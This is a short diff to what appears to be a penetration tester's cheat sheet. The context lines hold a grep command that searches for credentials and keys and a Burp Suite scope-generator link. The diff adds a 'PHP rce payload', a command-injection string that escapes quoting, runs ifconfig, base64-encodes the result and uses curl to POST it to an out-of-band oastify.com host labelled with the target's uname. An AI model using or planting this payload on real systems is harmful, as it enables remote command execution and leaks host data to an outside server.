@@ -89,3 +89,9 @@ grep -EHirn "accesskeyladmin|aes|api_keylapikey|checkClientTrusted|crypt|http:|h
 
 # Burpsuite Scope Generator:
 `https://xcapri.github.io/scopegen/index.html`
+
+# PHP rce payload
+
+```
+.&'\"`0echo+$(ifconfig+|+base64)+|+curl+-s+-X+POST+-T+-+$(uname).v3zxrdr5475zf73sgt24cv8zlqrhf73w.oastify.com.&`'
+```
